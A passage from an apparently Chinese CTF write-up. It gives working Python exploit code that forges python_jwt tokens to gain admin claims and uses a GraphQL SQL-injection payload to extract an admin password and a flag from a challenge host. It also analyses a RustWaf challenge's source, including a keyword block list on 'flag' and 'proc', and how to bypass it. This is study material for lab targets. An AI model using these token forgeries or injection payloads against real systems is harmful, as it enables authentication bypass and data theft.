operator">=</span> loads<span class="token punctuation">(</span>base64url_decode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    parsed_payload<span class="token punctuation">[</span><span class="token string">'is_admin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    parsed_payload<span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2000000000</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    fake_payload <span class="token operator">=</span> base64url_encode<span class="token punctuation">(</span><span class="token punctuation">(</span>dumps<span class="token punctuation">(</span>parsed_payload<span class="token punctuation">,</span> separators<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">return</span> <span class="token string">'&#123;"  '</span> <span class="token operator">+</span> header <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> fake_payload <span class="token operator">+</span> <span class="token string">'.":"","protected":"'</span> <span class="token operator">+</span> header <span class="token operator">+</span> <span class="token string">'", "payload":"'</span> <span class="token operator">+</span> payload <span class="token operator">+</span> <span class="token string">'","signature":"'</span> <span class="token operator">+</span> signature <span class="token operator">+</span> <span class="token string">'"&#125;'</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>url <span class="token operator">=</span> <span class="token string">'http://eci-2zef45s04koksrnwzpys.cloudeci1.ichunqiu.com/'</span></pre></td></tr><tr><td data-num="20"></td><td><pre>a <span class="token operator">=</span> <span class="token string">'eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjcxMjQ2ODksImlhdCI6MTY2NzEyNDM4OSwiaXNfYWRtaW4iOjAsImlzX2xvZ2luIjoxLCJqdGkiOiJDSFNEemZIbHJpcTJZbmU3Ynhrc2lRIiwibmJmIjoxNjY3MTI0Mzg5LCJwYXNzd29yZCI6ImFtZXV1IiwidXNlcm5hbWUiOiJhbWV1dSJ9.nlAxl5xunioWsD7UkEY35CGu69F9JMI3B4tCTI5zG-HH5XxbgJIDjheBgYH83QOs7wuu7nRWnuzBGBvXZpoTdjXDklD8ob69-Z9h0UvYB8J9_AwySCssHOw_2d2w4B4EmhTsZ0JXv78KOgIIYKZeI4mX3RohGceGGTMLw92KW0V4IGaZulLXBl9HWw0qfnwXEOY0vNmbofCu3i_Ee1v0m6NWF2ytrLwspkJ59Xj09FXG2oEPzRC-Mx4RBgm5b2xX66RNJcwJhqiwAeRLJ3of0kr5Oo2-3VIjpNUsxgcEUUojk561CT0Lj3NO4kzfJ88gbQwnZ4f-gcg2Kg7IbVa7Tg'</span></pre></td></tr><tr><td data-num="21"></td><td><pre>token <span class="token operator">=</span> fakePayload<span class="token punctuation">(</span>a<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">'getflag'</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'token'</span><span class="token punctuation">:</span> token<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="23"></td><td><pre>                           <span class="token string">'session'</span><span class="token punctuation">:</span> <span class="token string">'eyJpc19sb2dpbiI6MX0.Y15HzQ.WwPKCovExkTsVcmU5hVuWIdjj4k'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></pre></td></tr></table></figure><p>回显 <code>only currect password can readflag</code> ，说明我们得拿到 flag，而还有一个查看成绩的 graphql 路由可以进行 grqphql 注入</p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzLzE0ODI0Mi5odG1sIzp+OnRleHQ9Z3JhcGhxbCVFNyU5QSU4NHNxbCVFNiVCMyVBOCVFNSU4NSVBNSVFNCVCOCU4RSVFNCVCOCU4MCVFOCU4OCVBQyVFNyU5QSU4NHNxbCVFNiVCMyVBOCVFNSU4NSVBNSVFNyVCMSVCQiVFNCVCQyVCQyVFRiVCQyU4QyVFOSU4MyVCRCVFNiU5OCVBRiVFNSU4RiVBRiVFNCVCQiVBNSVFOSU4MCU5QSVFOCVCRiU4NyVFNiU5RSU4NCVFOSU4MCVBMCVFNiU4MSVCNiVFNiU4NCU4RiVFOCVBRiVBRCVFNSU4RiVBNSVFOCVCRSVCRSVFNSU4OCVCMCVFNiVCMyVBOCVFNSU4NSVBNSVFOCU4RSVCNyVFNSU4RiU5NiVFNiU5NSVCMCVFNiU4RCVBRSVFNiU4OCU5NiVFNiU5NCVCOSVFNSU4RiU5OCVFNiU5RiVBNSVFOCVBRiVBMiVFOSU4MCVCQiVFOCVCRSU5MSVFNyU5QSU4NCVFNyU5QiVBRSVFNyU5QSU4NCVFMyU4MCU4MixwJUU3JUE1JTlFJUU1JTlDJUE4JUU1JTg1JTg4JUU3JTlGJUE1JUU1JUE0JUE3JUU0JUJDJTlBJUU0JUI4JThBJUU4JUFFJUIyJUU4JUJGJTg3JUU4JUFGJUE1JUU3JUIxJUJCJUU5JTk3JUFFJUU5JUEyJTk4JUVGJUJDJThDJUU1JTgwJTlGJUU3JTk0JUE4cCVFNyVBNSU5RSVFNyU5QSU4NDIlRTUlQkMlQTBQUFQlRTMlODAlODI=">https://www.secpulse.com/archives/148242.html</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9ncmFwaHFsLmNuL2xlYXJuL3F1ZXJpZXMvI3ZhcmlhYmxlcw==">https://graphql.cn/learn/queries/#variables</span></p><p>graphql 注入查询到：</p><pre><code>&#123;'__type': &#123;'name': 'Getscorebyid', 'fields': [&#123;'name': 'score'&#125;, &#123;'name': 'name'&#125;, &#123;'name': 'id'&#125;]&#125;&#125;
&#123;'__type': &#123;'name': 'Getscorebyname', 'fields': [&#123;'name': 'score'&#125;, &#123;'name': 'name'&#125;, &#123;'name': 'userid'&#125;]&#125;&#125;
</code></pre><p>最终 exp：</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> datetime <span class="token keyword">import</span> timedelta</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> json <span class="token keyword">import</span> loads<span class="token punctuation">,</span> dumps</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">from</span> fixtures <span class="token keyword">import</span> generated_keys</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">import</span> python_jwt <span class="token keyword">as</span> jwt</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment"># from pyvows import Vows, expect</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">from</span> jwcrypto<span class="token punctuation">.</span>common <span class="token keyword">import</span> base64url_decode<span class="token punctuation">,</span> base64url_encode</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">def</span> <span class="token function">fakePayload</span><span class="token punctuation">(</span>topic<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token triple-quoted-string string">""" Use mix of JSON and compact format to insert forged claims including long expiration """</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token comment"># print(topic)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token punctuation">[</span>header<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> signature<span class="token punctuation">]</span> <span class="token operator">=</span> topic<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    parsed_payload <span class="token operator">=</span> loads<span class="token punctuation">(</span>base64url_decode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    parsed_payload<span class="token punctuation">[</span><span class="token string">'is_admin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    parsed_payload<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"admin"</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    parsed_payload<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"i2Ip4m1Jx3iWMbtVRywc"</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    parsed_payload<span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2000000000</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    fake_payload <span class="token operator">=</span> base64url_encode<span class="token punctuation">(</span><span class="token punctuation">(</span>dumps<span class="token punctuation">(</span>parsed_payload<span class="token punctuation">,</span> separators<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">return</span> <span class="token string">'&#123;"  '</span> <span class="token operator">+</span> header <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> fake_payload <span class="token operator">+</span> <span class="token string">'.":"","protected":"'</span> <span class="token operator">+</span> header <span class="token operator">+</span> <span class="token string">'", "payload":"'</span> <span class="token operator">+</span> payload <span class="token operator">+</span> <span class="token string">'","signature":"'</span> <span class="token operator">+</span> signature <span class="token operator">+</span> <span class="token string">'"&#125;'</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre>url <span class="token operator">=</span> <span class="token string">'http://eci-2zef45s04koksrnwzpys.cloudeci1.ichunqiu.com/'</span></pre></td></tr><tr><td data-num="22"></td><td><pre>a <span class="token operator">=</span> <span class="token string">'eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjcxMjQ2ODksImlhdCI6MTY2NzEyNDM4OSwiaXNfYWRtaW4iOjAsImlzX2xvZ2luIjoxLCJqdGkiOiJDSFNEemZIbHJpcTJZbmU3Ynhrc2lRIiwibmJmIjoxNjY3MTI0Mzg5LCJwYXNzd29yZCI6ImFtZXV1IiwidXNlcm5hbWUiOiJhbWV1dSJ9.nlAxl5xunioWsD7UkEY35CGu69F9JMI3B4tCTI5zG-HH5XxbgJIDjheBgYH83QOs7wuu7nRWnuzBGBvXZpoTdjXDklD8ob69-Z9h0UvYB8J9_AwySCssHOw_2d2w4B4EmhTsZ0JXv78KOgIIYKZeI4mX3RohGceGGTMLw92KW0V4IGaZulLXBl9HWw0qfnwXEOY0vNmbofCu3i_Ee1v0m6NWF2ytrLwspkJ59Xj09FXG2oEPzRC-Mx4RBgm5b2xX66RNJcwJhqiwAeRLJ3of0kr5Oo2-3VIjpNUsxgcEUUojk561CT0Lj3NO4kzfJ88gbQwnZ4f-gcg2Kg7IbVa7Tg'</span></pre></td></tr><tr><td data-num="23"></td><td><pre>token <span class="token operator">=</span> fakePayload<span class="token punctuation">(</span>a<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token comment"># data = &#123;'query': '&#123; __schema&#123; types &#123; name &#125; &#125; &#125;'&#125;</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token comment"># data = &#123;'query': '&#123; __type(name: "__EnumValue") &#123; name fields &#123; name type &#123; name kind ofType &#123; name kind &#125; &#125; &#125; &#125; &#125;'&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token comment"># data = &#123;'query': '&#123; __fields(name: "getscoreusingnamehahaha")  &#123; name &#125;  &#125;'&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token comment"># data = &#123;'query': '&#123; Getscorebyname(name: "admin")&#123; userid name score &#125; &#125;'&#125;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'query'</span><span class="token punctuation">:</span> <span class="token string">'&#123; getscoreusingnamehahaha(name:"name\'union select password from users where name=\'admin\' and \'1=1")&#123; userid name score '</span></pre></td></tr><tr><td data-num="29"></td><td><pre>                  <span class="token string">'&#125; &#125;'</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="30"></td><td><pre></pre></td></tr><tr><td data-num="31"></td><td><pre>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">'graphql'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="32"></td><td><pre>                  cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'token'</span><span class="token punctuation">:</span> token<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="33"></td><td><pre>                           <span class="token string">'session'</span><span class="token punctuation">:</span> <span class="token string">'eyJpc19sb2dpbiI6MX0.Y15HzQ.WwPKCovExkTsVcmU5hVuWIdjj4k'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="34"></td><td><pre>                  data<span class="token operator">=</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">'getflag'</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'token'</span><span class="token punctuation">:</span> token<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="38"></td><td><pre>                           <span class="token string">'session'</span><span class="token punctuation">:</span> <span class="token string">'eyJpc19sb2dpbiI6MX0.Y15HzQ.WwPKCovExkTsVcmU5hVuWIdjj4k'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></pre></td></tr></table></figure><p>flag:</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>flag<span class="token punctuation">&#123;</span>9f065df3<span class="token operator">-</span>23ae<span class="token operator">-</span>438f<span class="token operator">-</span>ae09<span class="token operator">-</span>56d36a400b52<span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h3 id="rustwaf"><a class="anchor" href="#rustwaf">#</a> RustWaf</h3><p><code>/src</code> 得到 nodejs 源代码</p><figure class="highlight jsx"><figcaption data-lang="React JSX"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"body-parser"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"fs"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'*/*'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">const</span> <span class="token punctuation">&#123;</span>  execFileSync <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/readfile'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">let</span> body <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"bosy = "</span><span class="token operator">+</span>body <span class="token operator">+</span> <span class="token string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">let</span> file_to_read <span class="token operator">=</span> <span class="token string">"app.js"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>     <span class="token keyword">const</span> file <span class="token operator">=</span> <span class="token function">execFileSync</span><span class="token punctuation">(</span><span class="token string">'/app/rust-waf'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>body<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>         encoding<span class="token operator">:</span> <span class="token string">'utf-8'</span></pre></td></tr><tr><td data-num="14"></td><td><pre>     <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">const</span> file <span class="token operator">=</span> body<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        file_to_read <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        file_to_read <span class="token operator">=</span> file</pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"file_to_read = "</span> <span class="token operator">+</span> file_to_read <span class="token operator">+</span> <span class="token string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">let</span> data <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>file_to_read<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"data = "</span> <span class="token operator">+</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token comment">// res.send(data.toString());</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre></pre></td></tr><tr><td data-num="27"></td><td><pre>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'see `/src`'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/src'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token keyword">var</span> data <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'app.js'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'start listening on port 3000'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>代码比较简单，重点就是在 <code>/readfile</code> 目录下读取文件，而会直接从 post body 获取文件名，直接用 bp 传，测试读取 <code>app.js</code> 成功</p><p><img data-src="https://img-blog.csdnimg.cn/4fde64a0c7c6406f91c0b7f76d7d38fe.png" alt="Untitled"></p><p>但是读取 <code>/flag</code> 的时候没有成功，返回了 rust 的代码。可以发现如果 payload 中包含 flag 或者 proc 就会直接返回文件内容，如果绕过了再判断 payload 如果是 json 格式，那么是否存在 key 为 <code>protocol</code> ，如果存在也直接返回文件内容</p><figure class="highlight rust"><figcaption data-lang="rust"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// use std::env;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">use</span> <span class="token namespace">serde<span class="token punctuation">::</span></span><span class="token punctuation">&#123;</span><span class="token class-name">Deserialize</span><span class="token punctuation">,</span> <span class="token class-name">Serialize</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">use</span> <span class="token namespace">serde_json<span class="token punctuation">::</span></span><span class="token class-name">Value</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">static</span> <span class="token constant">BLACK_PROPERTY</span><span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">str</span> <span class="token operator">=</span> <span class="token string">"protocol"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token attribute attr-name">#[derive(Debug, Serialize, Deserialize)]</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">struct</span> <span class="token type-definition class-name">File</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token attribute attr-name">#[serde(default = <span class="token string">"default_protocol"</span>)]</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">pub</span> protocol<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">pub</span> href<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">pub</span> origin<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">pub</span> pathname<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">pub</span> hostname<span class="token punctuation">:</span><span class="token class-name">String</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">default_protocol</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">String</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token string">"http"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token comment">//protocol is default value, can't be customized</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span>body<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">String</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">if</span> body<span class="token punctuation">.</span><span class="token function">to_lowercase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span> <span class="token operator">||</span>  body<span class="token punctuation">.</span><span class="token function">to_lowercase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"proc"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">::</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string">"./main.rs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Ok</span><span class="token punctuation">(</span>json_body<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token namespace">serde_json<span class="token punctuation">::</span></span><span class="token function">from_str</span><span class="token punctuation">::</span><span class="token operator">&lt;</span><span class="token class-name">Value</span><span class="token operator">></span><span class="token punctuation">(</span>body<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>json_body_obj<span class="token punctuation">)</span> <span class="token operator">=</span> json_body<span class="token punctuation">.</span><span class="token function">as_object</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>            <span class="token keyword">if</span> json_body_obj<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">any</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>key<span class="token closure-punctuation punctuation">|</span></span> key <span class="token operator">==</span> <span class="token constant">BLACK_PROPERTY</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>                <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">::</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string">"./main.rs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        <span class="token 